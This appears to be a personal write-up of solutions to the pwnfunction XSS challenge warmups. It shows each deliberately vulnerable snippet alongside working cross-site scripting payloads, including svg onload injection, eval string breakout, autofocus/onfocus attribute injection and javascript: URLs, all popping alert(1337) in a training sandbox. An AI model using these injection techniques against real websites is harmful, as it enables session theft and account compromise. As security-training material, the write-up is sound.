# pwnfunction XSS game

## Warmups

### Ma Spaghet!

```html
<h2 id="spaghet"></h2>
<script>
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
</script>
```

My solution: `https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=<svg>onload=alert(1337)>`

### Jefff

```html
<h2 id="maname"></h2>
<script>
    let jeff = (new URL(location).searchParams.get('jeff') || "JEFFF")
    let ma = ""
    eval(`ma = "Ma name ${jeff}"`)
    setTimeout(_ => {
        maname.innerText = ma
    }, 1000)
</script>
```

- I tried concatenation where `%2b` is `+`: `https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=abc"%2b"xyz`
- Then got a working payload: `https://sandbox.pwnfunction.com/warmups/jefff.html?jeff="%2balert(1337)%2b"`
- Intended solution: `"-alert(1337)-"`

### Ugandan Knuckles

```html
<div id="uganda"></div>
<script>
    let wey = (new URL(location).searchParams.get('wey') || "do you know da wey?");
    wey = wey.replace(/[<>]/g, '')
    uganda.innerHTML = `<input type="text" placeholder="${wey}" class="form-control">`
</script>
```

My solution (same as rxss-angles-encoded in portswigger): `" autofocus onfocus="alert(1337)`
Intended solution: `"onfocus=alert(1337) autofocus="`

### Ricardo Milos

```html
<form id="ricardo" method="GET">
    <input name="milos" type="text" class="form-control" placeholder="True" value="True">
</form>
<script>
    ricardo.action = (new URL(location).searchParams.get('ricardo') || '#')
    setTimeout(_ => {
        ricardo.submit()
    }, 2000)
</script>
```

- Spent a lot of time hacking the wrong parameter `milos` instead use `ricardo`.
- My solution: `https://sandbox.pwnfunction.com/warmups/ricardo.html?ricardo=javascript:alert(1337)`
- Intended solution: `javascript:alert(1337)`

### Ah That's Hawt

```html
<h2 id="will"></h2>
<script>
    smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
    smith = smith.replace(/[\(\`\)\\]/g, '')
    will.innerHTML = smith
</script>
```

